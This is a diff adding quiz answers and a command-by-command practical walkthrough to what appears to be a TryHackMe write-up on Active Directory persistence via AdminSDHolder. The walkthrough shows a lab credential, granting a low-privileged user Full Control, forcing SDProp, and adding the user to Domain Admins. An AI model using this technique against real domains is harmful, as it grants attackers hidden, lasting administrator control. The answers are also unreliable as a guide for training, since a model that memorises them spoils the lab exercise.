@@ -1023,10 +1023,87 @@ Imagine combining this with the nesting groups of the previous task. Just as the
 ### Answer the questions below
 
 * What AD group's ACLs are used as a template for the ACLs of all Protected Groups?
+	
+	`AdminSDHolder`
 
 * What AD service updates the ACLs of all Protected Groups to match that of the template?
 
+	`SDProp`
+
 * What ACL permission allows the user to perform any action on the AD object?
+
+	`Full Control`
+
+* Practical
+
+	* Get the credential
+	
+		![task7-cred](./images/task7-cred.png)
+
+	* Login RDP to THMWRK1 
+	
+		```
+		xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'alice.gibson' /p:'Scores1981'
+		```
+
+		![task7-ssh](./images/task7-ssh.png)
+
+	* Runas command to inject the Administrator credentials
+	
+		```
+		runas /netonly /user:za.tryhackme.loc\Administrator cmd.exe
+		```
+
+		![task7-runas](./images/task7-runas.png)
+
+	* Run MMC and add the Users and Groups Snap-in, make sure to enable Advanced Features
+	
+		![task7-snapin](./images/task7-snapin.png)
+
+	* Navigate to the Security of the group and add our low-privileged
+	
+		![task7-add](./images/task7-add.png)
+
+	* Set our low-privileged user and grant Full Control
+	
+		![task7-full](./images/task7-full.png)
+
+	* WinRM to the domain controller as the DA
+	
+		```
+		Enter-PSSession -ComputerName thmdc.za.tryhackme.loc
+		```
+
+		![task7-winrm](./images/task7-winrm.png)
+
+	* Now running a PowerShell session on the domain controller and update SDProp
+	
+		```
+		Import-Module C:\Tools\Invoke-ADSDPropagation.ps1
+		Invoke-ADSDPropagation
+		```
+
+		![task7-update](./images/task7-update.png)
+
+	* Add ourselves as a member to a protected group from PowerShell windows on THMWRK1  
+	
+		```
+		Add-ADGroupMember -Identity "Domain Admins" -Members "alice.gibson"
+		Get-ADGroupMember -Identity "Domain Admins" | Where-Object {$_.SamAccountName -eq 'alice.gibson'}
+		```
+
+		![task7-add-admin](./images/task7-add-admin.png)
+
+	* Verify our user as Domain user
+	
+		```
+		dir \\thmdc.za.tryhackme.loc\C$\Users
+		```
+
+		![task7-verify](./images/task7-verify.png)
+
+		![task7-verify2](./images/task7-verify2.png)
+
 
 ## Task 8 - Persistence through GPOs
 
